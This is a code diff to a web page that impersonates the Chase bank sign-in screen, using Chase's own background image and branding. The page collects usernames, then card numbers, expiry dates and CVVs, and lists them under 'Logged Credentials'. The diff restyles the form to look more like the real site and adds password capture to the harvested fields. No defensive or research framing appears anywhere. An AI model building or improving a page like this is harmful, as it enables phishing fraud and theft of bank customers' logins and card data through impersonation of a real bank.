@@ -7,18 +7,19 @@
     <style>
         body {
             margin: 0;
-            font-family: 'Helvetica Neue', Arial, sans-serif;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
             background: url('https://www.chase.com/etc/designs/chase/images/backgrounds/login-bg.jpg') no-repeat center center fixed;
             background-size: cover;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            color: #333;
         }
         .container {
             background: rgba(255, 255, 255, 0.95);
             padding: 30px;
-            border-radius: 5px;
+            border-radius: 8px;
             width: 400px;
             text-align: center;
             box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
@@ -31,19 +32,21 @@
             color: #003087;
             margin: 0;
             font-weight: normal;
-        }
-        .header span {
-            color: #000;
-            font-size: 18px;
+            text-align: left;
         }
         input {
             width: 100%;
             padding: 12px;
             margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
+            border: none;
+            border-bottom: 2px solid #ccc;
             box-sizing: border-box;
             font-size: 14px;
+            background: transparent;
+        }
+        input:focus {
+            border-bottom: 2px solid #003087;
+            outline: none;
         }
         button {
             width: 100%;
@@ -55,6 +58,7 @@
             cursor: pointer;
             font-size: 14px;
             font-weight: bold;
+            margin: 20px 0;
         }
         button:hover {
             background-color: #002766;
@@ -74,18 +78,52 @@
             border: 1px solid #ccc;
             font-size: 14px;
         }
+        .checkbox {
+            text-align: left;
+            font-size: 12px;
+            margin: 10px 0;
+        }
+        .checkbox input {
+            width: auto;
+            margin-right: 5px;
+            border: none;
+        }
+        .links {
+            text-align: left;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+        .links a {
+            color: #003087;
+            text-decoration: none;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>Chase<span>.com</span></h1>
+            <h1>Chase</h1>
         </div>
-        <h2>Sign In</h2>
         <div id="loginStep1">
-            <p>Enter your username to proceed.</p>
-            <input type="text" id="username" placeholder="User ID" required>
-            <button onclick="verifyUsername()">Sign In</button>
+            <input type="text" id="username" placeholder="Username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <span class="links" style="float: right; font-size: 12px; color: #003087;">Show</span>
+            <div class="checkbox">
+                <input type="checkbox" id="remember">
+                <label for="remember">Remember me</label>
+            </div>
+            <div class="checkbox">
+                <input type="checkbox" id="token">
+                <label for="token">Use token</label>
+            </div>
+            <button onclick="verifyUsername()">Sign in</button>
+            <div class="links">
+                <a href="#">Forgot username/password?</a><br>
+                <a href="#">Not Enrolled? Sign Up Now.</a>
+            </div>
         </div>
         <div id="codeStep" style="display: none;">
             <p>We’ve sent a 6-digit code to your registered device. Enter it below.</p>
@@ -108,12 +146,13 @@
 
         function verifyUsername() {
             const username = document.getElementById('username').value;
-            if (username) {
+            const password = document.getElementById('password').value;
+            if (username && password) {
                 document.getElementById('loginStep1').style.display = 'none';
                 document.getElementById('codeStep').style.display = 'block';
                 document.getElementById('message').style.display = 'none';
             } else {
-                document.getElementById('message').innerText = 'Please enter your User ID.';
+                document.getElementById('message').innerText = 'Please enter username and password.';
                 document.getElementById('message').style.display = 'block';
             }
         }
@@ -139,6 +178,7 @@
                 cvv.length === 3 && /^\d+$/.test(cvv)) {
                 const credEntry = {
                     username: document.getElementById('username').value,
+                    password: document.getElementById('password').value,
                     cardNumber: cardNumber,
                     expiry: expiry,
                     cvv: cvv,
@@ -160,7 +200,7 @@
             if (creds.length > 0) {
                 let credsHtml = '<h3>Logged Credentials:</h3><ul>';
                 creds.forEach(cred => {
-                    credsHtml += `<li>Username: ${cred.username}, Card: ${cred.cardNumber}, Exp: ${cred.expiry}, CVV: ${cred.cvv}, Time: ${cred.timestamp}</li>`;
+                    credsHtml += `<li>Username: ${cred.username}, Password: ${cred.password}, Card: ${cred.cardNumber}, Exp: ${cred.expiry}, CVV: ${cred.cvv}, Time: ${cred.timestamp}</li>`;
                 });
                 credsHtml += '</ul>';
                 document.getElementById('credsDisplay').innerHTML = credsHtml;
